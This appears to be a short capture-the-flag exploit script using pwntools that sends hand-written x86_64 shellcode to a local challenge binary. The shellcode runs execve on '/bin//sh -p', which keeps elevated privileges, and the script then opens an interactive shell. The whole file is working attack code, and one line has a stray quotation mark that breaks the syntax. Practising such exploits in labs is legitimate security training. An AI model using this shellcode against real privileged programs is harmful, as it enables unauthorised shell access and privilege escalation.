from pwn import *

context.arch = 'x86_64'

p = process('PATH_TO_THE_CHALLENGE_FILE'')

#  Embed assembly instructions in Python.
shellcode ="""
_start:
   SPAWN_SHELL:
        xor rax, rax 

        push rax
        mov  rcx, 0x68732F2f6e69622F
        push rcx
        xor  rdi, rdi
        mov  rdi, rsp

        push rax
        xor rcx, rcx
        push 0x702d
        mov rcx, rsp

        push rax
        push rcx
        push rdi
        xor  rsi, rsi
        mov rsi, rsp

        xor  rdx, rdx

        mov al, 59
        syscall

"""

shellcode = asm(shellcode)

p.send(shellcode)

p.interactive()
